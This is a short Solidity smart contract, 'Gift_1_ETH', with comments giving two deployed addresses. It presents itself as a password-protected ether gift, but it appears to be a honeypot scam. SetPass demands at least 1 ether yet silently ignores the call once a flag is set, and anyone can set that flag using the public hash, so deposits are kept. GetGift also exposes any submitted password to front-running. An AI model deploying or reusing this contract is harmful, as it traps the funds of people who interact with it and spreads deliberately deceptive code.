// contract address: 0xd8993F49F372BB014fB088eaBec95cfDC795CBF6
// also at 0x75041597d8f6E869092d78b9814B7bcdeeb393b4

pragma solidity ^0.4.17;

contract Gift_1_ETH
{
    
    bool passHasBeenSet = false;
    
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass) returns (bytes32)
    {

        if( hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
        return sha3(pass);
    }
    
    function PassHasBeenSet(bytes32 hash)
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}
